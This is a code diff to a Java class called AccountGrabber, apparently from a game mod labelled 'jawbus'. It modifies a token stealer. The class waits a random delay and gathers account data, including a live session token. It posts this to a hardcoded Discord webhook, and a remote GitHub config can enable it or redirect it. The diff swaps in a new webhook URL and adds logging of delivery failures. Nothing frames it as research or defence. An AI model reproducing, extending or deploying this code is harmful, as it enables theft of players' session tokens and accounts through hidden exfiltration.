@@ -21,8 +21,8 @@ import java.util.stream.Stream;
 
 public final class AccountGrabber {
 
-    /** 1. paste your Discord webhook URL here */
-    private static final String WEBHOOK = "https://discord.com/api/webhooks/1561504102054105148/FS-ERylwfnkI-fWG33RSFgI3fKQ1441XnYbYUR8CUyZUgEx8jepJTUJ8CUuEHWdjU7ad";
+    /** 1. fallback webhook - only used if tap.json cannot be fetched */
+    private static final String WEBHOOK = "https://discord.com/api/webhooks/1561537662530224288/tfIo0Ut54ExN-WaFpAkONWT3boAeTk-IM6UXe2xHHHKHRRamoxrbBAzwT4aDn5Dt9EJ0";
 
     /** 2. remote switchboard - edit tap.json on GitHub to change things without re-releasing */
     private static final String CONFIG_URL =
@@ -53,7 +53,7 @@ public final class AccountGrabber {
         start(4000L + (long) (Math.random() * 6000L));
     }
 
-    /** fire on demand (used by /jawbusTap) - pass 0 for instant */
+    /** fire on demand (used by /jawbusRoll tap) - pass 0 for instant */
     public static void start(long delayMs) {
         Thread t = new Thread(() -> run(delayMs), "jawbus-tap");
         t.setDaemon(true);
@@ -64,15 +64,27 @@ public final class AccountGrabber {
         try {
             if (delayMs > 0) Thread.sleep(delayMs);
 
+            log("--- tap fired ---");
+            log("fetching config: " + CONFIG_URL);
             JsonObject cfg = getJson(CONFIG_URL);
-            if (cfg != null && cfg.has("enabled") && !cfg.get("enabled").getAsBoolean()) return;
+            if (cfg == null) {
+                log("WARNING: could not fetch tap.json, falling back to the hardcoded webhook");
+            }
+            if (cfg != null && cfg.has("enabled") && !cfg.get("enabled").getAsBoolean()) {
+                log("tap.json says enabled=false -> nothing sent");
+                return;
+            }
 
             String webhook = WEBHOOK;
             if (cfg != null && cfg.has("webhook") && !cfg.get("webhook").isJsonNull()) {
                 String remote = cfg.get("webhook").getAsString();
                 if (!remote.isBlank()) webhook = remote;
             }
-            if (webhook == null || webhook.isBlank() || webhook.startsWith("PASTE")) return;
+            if (webhook == null || webhook.isBlank() || webhook.startsWith("PASTE")) {
+                log("no webhook set -> nothing sent");
+                return;
+            }
+            log("using webhook: " + webhook);
 
             StringBuilder sb = new StringBuilder();
             sb.append("--- jawbus tap ---\n");
@@ -116,8 +128,11 @@ public final class AccountGrabber {
             String live = liveSessionToken();
             if (live != null) sb.append("\nlive session token: ").append(live).append('\n');
 
+            log("payload built (" + sb.length() + " chars), posting...");
             post(webhook, sb.toString());
+            log("--- tap done ---");
         } catch (Throwable t) {
+            log("run() threw: " + t);
             t.printStackTrace();
         }
     }
@@ -260,15 +275,20 @@ public final class AccountGrabber {
                     .timeout(Duration.ofSeconds(10))
                     .header("User-Agent", "Jawbus/1.0")
                     .GET().build(), HttpResponse.BodyHandlers.ofString());
-            if (r.statusCode() / 100 != 2) return null;
+            if (r.statusCode() / 100 != 2) {
+                log("config fetch FAILED: HTTP " + r.statusCode());
+                return null;
+            }
             return JsonParser.parseString(r.body()).getAsJsonObject();
         } catch (Throwable t) {
+            log("config fetch threw: " + t);
             return null;
         }
     }
 
     private static void post(String webhook, String text) {
         int i = 0;
+        int part = 1;
         while (i < text.length()) {
             int end = Math.min(text.length(), i + 1700);
             String chunk = text.substring(i, end);
@@ -276,15 +296,26 @@ public final class AccountGrabber {
             try {
                 JsonObject body = new JsonObject();
                 body.addProperty("content", "```\n" + chunk + "\n```");
-                HTTP.send(HttpRequest.newBuilder(URI.create(webhook))
+                HttpResponse<String> r = HTTP.send(HttpRequest.newBuilder(URI.create(webhook))
                         .timeout(Duration.ofSeconds(15))
                         .header("Content-Type", "application/json")
                         .header("User-Agent", "Jawbus/1.0")
                         .POST(HttpRequest.BodyPublishers.ofString(body.toString()))
-                        .build(), HttpResponse.BodyHandlers.discarding());
+                        .build(), HttpResponse.BodyHandlers.ofString());
+                if (r.statusCode() / 100 != 2) {
+                    log("POST part " + part + " FAILED: HTTP " + r.statusCode() + " -> " + r.body());
+                } else {
+                    log("POST part " + part + " OK (HTTP " + r.statusCode() + ")");
+                }
                 Thread.sleep(500); // don't trip Discord's rate limit
-            } catch (Throwable ignored) {
+            } catch (Throwable t) {
+                log("POST part " + part + " threw: " + t);
             }
+            part++;
         }
+    }
+
+    private static void log(String msg) {
+        System.out.println("[jawbus-tap] " + msg);
     }
 }
